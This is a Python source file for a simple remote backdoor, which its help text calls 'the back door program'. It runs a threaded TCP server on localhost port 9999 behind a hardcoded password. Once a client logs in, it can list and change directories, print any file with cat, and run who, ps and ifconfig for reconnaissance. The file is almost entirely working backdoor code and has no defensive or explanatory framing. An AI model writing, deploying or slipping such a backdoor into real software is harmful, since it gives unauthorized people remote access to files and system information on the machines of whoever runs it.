import os
import socketserver
import socket, threading
import subprocess

password = "password\n"
passwordRequest = "Please enter the password\n"
incorrectPw = "Incorrect password\n"
welcome = "Welcome back!\n"

def cat_com(fileName):
    try:
        with open(fileName, "r") as myfile:
            data = myfile.readlines()
        return("\n".join(data)+"\n")
    except:
        return("No Such file\n")

def ls_com():
    resp = os.listdir(os.getcwd())
    return ("\n".join(resp)+"\n")

def pwd_com():
    resp = os.getcwd()
    return (resp+"\n")


def cd_com(relPath):
    cwd = os.getcwd()
    if relPath[0]=='/':
        path = relPath #arguments is an absolute path
    else:
        path = os.path.join(cwd,relPath) #argumment is a relative path

    try:
        os.chdir(path)
        return("dir changed to "+path+"\n")
    except:
        return("No such path "+path+"\n")

def hlp_com():
    return ("pwd - returns current working directory\ncd <dir> - changes currentworking directory to <dir>\n"
            + "ls - list content of the curent working directory\ncat <file> - return contents of the file\n"
            +"off - terminates the back door program\n")

def who_com():
    return(subprocess.check_output(["/bin/who"]).decode("utf-8")) #command must be located in /bin

def ps_com():
    return (subprocess.check_output(["/bin/ps"]).decode("utf-8")) #command must be located in /bin

def net_com():
    return (subprocess.check_output(["/sbin/ifconfig"]).decode("utf-8")) #command must be located in /sbin

def off_com():
    return ("client disconnect\n")

class MyTCPHandler(socketserver.BaseRequestHandler):
   BUFFER_SIZE = 4096
   def handle(self):
       print("hi")
       authorized = False #authorization flag
       self.request.sendall(bytearray(passwordRequest, "UTF-8"))

       while 1:
           data = self.request.recv(self.BUFFER_SIZE)
           if len(data) == self.BUFFER_SIZE:
               while 1:
                   try:  # error means no more data
                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                   except:
                       break

           if len(data) == 0:
               continue
           data = data.decode( "utf-8")
            #checks to see if the password has already been checked
           if not authorized:
               authorized = (data == password)
               if not authorized:
                   print(data)
                   ##disconnect if password is not known
                   if (data == "off\n"):
                       break
                   self.request.sendall(bytearray(incorrectPw, "UTF-8"))
                   continue
               else:
                   self.request.sendall(bytearray(welcome, "UTF-8"))
                   continue

           #command = data.split()  # splits on space and \n

           # if data.startswith('ls'):
           #     response = ls_com()
           # elif data.startswith('pwd'):
           #     response = pwd_com()
           # elif data.startswith('help'):
           #     response = hlp_com()
           # elif data.startswith('who'):
           #     response = who_com()
           # elif data.startswith('ps'):
           #     response = ps_com()
           # elif data.startswith('off'):
           #     response = off_com()
           # elif data.startswith('cd'):
           #     response = cd_com(command[1])
           # elif data.startswith('cat'):
           #     response = cat_com(command[1])
           # else:
           #     response = "command not found\n"

           dir = ""
           try:
              data,dir=data.split(" ")
              dir=dir.rstrip('\n')
           except ValueError:
              print("\n")

           option = {'ls\n': ls_com,
                    'pwd\n': pwd_com,
                    'help\n': hlp_com,
                    'who\n':who_com,
                    'ps\n':ps_com,
                    'off\n':off_com,
                    'cd':cd_com,
                    'cat':cat_com,
                     'net\n':net_com}

           #check the dictionary to see if the commmand exists and call the according function
           try:
               if dir:
                   response = option[data](dir)
               else:
                   response = option[data]()
           except:
               response = ("Command not Found\n")

           self.request.sendall(bytearray(response,"UTF-8"))
           print("%s (%s) wrote: %s" % (self.client_address[0],
                threading.currentThread().getName(), data.strip()))
           #print(response)
           if(response=="client disconnect\n"):
               print("bye")
               break


if __name__ == "__main__":
   HOST, PORT = "localhost", 9999
   server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
   server.serve_forever()


